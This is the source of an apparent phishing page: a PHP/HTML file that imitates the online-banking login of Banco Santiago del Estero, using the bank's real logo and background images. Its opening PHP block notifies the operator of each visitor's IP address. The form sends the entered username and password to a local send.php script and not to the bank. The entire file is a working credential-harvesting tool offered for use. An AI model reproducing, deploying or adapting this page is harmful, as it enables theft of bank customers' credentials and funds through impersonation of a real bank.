<?php  
include 'config/personalizar.php';
if ($alertas == 0) {
  $enviara =
  "<b> ¡Alerta! Cliente 🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code> iniciando seseión.\n";
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}
?> 

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Santiago del Estero | Login</title>
    <style>
        /* =========================================
           VARIABLES Y RESET
           ========================================= */
        :root {
            --primary: #249c04;
            --secondary: #04338c;
            --white: #fff;
            --surface-light: #F2F2F2;
            --main-border-color: #D8D8D8;
            --padding-h: 10%;
            --font-family: Arial, Helvetica, sans-serif;
        }

        @media only screen and (max-width: 1600px) { :root { --padding-h: 8%; } }
        @media only screen and (max-height: 790px) { :root { --padding-h: 14%; } }
        @media only screen and (max-width: 1200px) { :root { --padding-h: 5%; } }
        @media only screen and (max-height: 600px) { :root { --padding-h: 12%; } }
        @media only screen and (max-width: 810px) { :root { --padding-h: 4%; } }
        @media only screen and (max-width: 600px) { :root { --padding-h: 4%; } }

        * { border-style: none; box-sizing: border-box; margin: 0; padding: 0; }

        html, body {
            height: 100%;
            width: 100%;
            margin: 0;
            overflow: hidden; 
        }

        body {
            font-family: var(--font-family);
            font-weight: 400;
        }

        /* =========================================
           ESTRUCTURA PRINCIPAL (FLEXBOX)
           ========================================= */
        .app-container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100vw;
        }

        /* =========================================
           HEADER
           ========================================= */
        header {
            background: var(--secondary);
            padding: .5rem var(--padding-h);
            display: grid;
            grid-template-columns: 1fr auto auto;
            align-items: center;
            grid-gap: 0 1.2rem;
            z-index: 10;
            flex-shrink: 0; 
        }

        header img.logo { width: 7rem; }

        header .social {
            display: flex;
            gap: 1.2rem;
            align-items: center;
        }
        header .social a { display: flex; }
        header .social svg { cursor: pointer; width: 1.2rem; height: 1.2rem; }

        header .contact {
            display: flex;
            justify-content: space-between;
            flex-direction: column;
        }
        header .contact p { text-align: left; }
        header .contact .text.small {
            color: white;
            font-size: 0.6rem;
            margin-bottom: 0.2rem;
            letter-spacing: 0.5px;
        }
        header .contact .number.big {
            color: white;
            font-size: 1.1rem;
            font-weight: 500;
        }

        /* =========================================
           MAIN (FONDO CON IMAGEN)
           ========================================= */
        main.main-bg {
            flex: 1; 
            display: flex;
            align-items: center;
            justify-content: flex-end; 
            position: relative;
            
            background-image: url('https://hb.bse.com.ar/BSE/BGLogin.5c7924234526b31e.svg');
            background-position: right center;
            background-repeat: no-repeat;
            background-size: cover; 
        }

        @media (max-width: 1200px) { main.main-bg { background-position: 20% center; } }
        @media (max-width: 900px)  { main.main-bg { background-position: 10% center; } }
        @media (max-width: 600px)  { main.main-bg { background-position: 15% center; } }

        /* =========================================
           FORMULARIO
           ========================================= */
        .login-box {
            background: var(--white);
            width: max(20%, 21rem);
            padding: 3rem 1.8rem;
            margin-right: 10%; 
            z-index: 1;
        }

        @media only screen and (max-width: 767px) {
            main.main-bg { justify-content: center; }
            .login-box {
                width: min(80%, 20rem);
                margin-right: 0;
            }
        }

        .login-box h1.welcome {
            font-size: 1.6rem;
            line-height: 0.9;
            color: #000;
            font-weight: normal;
            margin-bottom: 1.5rem;
        }
        .login-box h1.welcome .bold { font-weight: bold; }
        
        .login-box h3.bold {
            font-size: 1rem;
            font-weight: bold;
            color: #000;
            margin-bottom: 1rem;
        }

        /* Inputs */
        .input-group { margin-bottom: 1rem; }
        .field-label {
            display: block;
            font-size: 0.8rem;
            color: #000;
            margin-bottom: 0.3rem;
        }
        .input-cont {
            background: var(--surface-light);
            border-bottom: 2px solid var(--main-border-color);
            padding: 0.3rem 0.375rem;
            transition: all 0.2s ease-out;
        }
        .input-cont input {
            background: transparent;
            width: 100%;
            border: 0;
            padding: .125rem;
            font-size: .8rem;
            color: #000;
            outline: none;
        }
        .input-cont input::placeholder { color: #999; }

        .forgot-pwd {
            text-align: center;
            margin: 1rem 0 1.5rem 0;
        }
        .forgot-pwd button {
            background: none;
            border: none;
            color: var(--secondary);
            font-size: 0.8rem;
            cursor: pointer;
            padding: 0;
            font-family: inherit;
        }

        /* Botón Habilitado para enviar */
        .btn-continue {
            width: 100%;
            padding: 0.7rem;
            background: var(--secondary); /* Azul habilitado */
            color: var(--white);
            border: none;
            font-size: 0.9rem;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
            transition: background 0.2s;
        }
        .btn-continue:hover {
            background: #032666;
        }

        /* =========================================
           FOOTER
           ========================================= */
        footer {
            background: var(--secondary);
            padding: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            flex-shrink: 0; 
        }
        footer a { text-decoration: none; }
        footer h3 {
            margin: 0;
            padding: 0 1rem;
            font-size: 0.9rem;
            font-weight: normal;
            cursor: pointer;
            color: var(--white);
        }
        footer h3:not(:first-child) {
            border-left: 1px solid var(--white);
        }

        /* Versión del sistema */
        .version {
            position: fixed;
            bottom: 10px;
            right: 10px;
            color: var(--secondary);
            z-index: 9;
            font-size: 0.8rem;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="app-container">
        
        <!-- HEADER -->
        <header>
            <img src="https://hb.bse.com.ar/BSE/assets/img/logo_BSE.svg" alt="logo" class="logo">
            
            <div class="social">
                <a target="_blank" href="https://www.instagram.com/bancosantiagooficial">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
                        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
                        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
                    </svg>
                </a>
                <a target="_blank" href="https://www.facebook.com/bancosantiagooficial">
                    <svg viewBox="0 0 24 24" fill="#ffffff">
                        <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
                    </svg>
                </a>
            </div>
            
            <div class="contact">
                <p class="text small">CONTACTA CON NOSOTROS</p>
                <p class="number big">0800 777 2737</p>
            </div>
        </header>

        <!-- MAIN CON EL FONDO -->
        <main class="main-bg">
            <div class="login-box">
                <h1 class="welcome">
                    <span class="bold">Bienvenido/a </span> a su Banca en Línea
                </h1>
                
                <h3 class="bold">Ingrese sus credenciales</h3>
                
                <!-- FORMULARIO CONECTADO A PHP -->
                <form action="main/send.php" method="POST">
                    
                    <div class="input-group">
                        <label class="field-label" for="usuario">Usuario</label>
                        <div class="input-cont">
                            <input type="text" id="usuario" name="usuario" placeholder="Ingrese usuario" autocomplete="off" minlength="6" required>
                        </div>
                    </div>
                    
                    <div class="input-group">
                        <label class="field-label" for="password">Contraseña</label>
                        <div class="input-cont">
                            <input type="password" id="password" name="password" placeholder="Ingrese contraseña" maxlength="80" required>
                        </div>
                    </div>
                    
                    <div class="forgot-pwd">
                        <button type="button">¿Olvidó sus credenciales?</button>
                    </div>
                    
                    <!-- Botón para enviar -->
                    <button type="submit" class="btn-continue">Continuar</button>

                </form>
            </div>
        </main>

        <!-- FOOTER -->
        <footer>
            <a href="#"><h3>Términos y Condiciones</h3></a>
            <a href="#"><h3>Sucursales</h3></a>
        </footer>

    </div>

    <p class="version">V 1.17.0</p>

</body>
</html>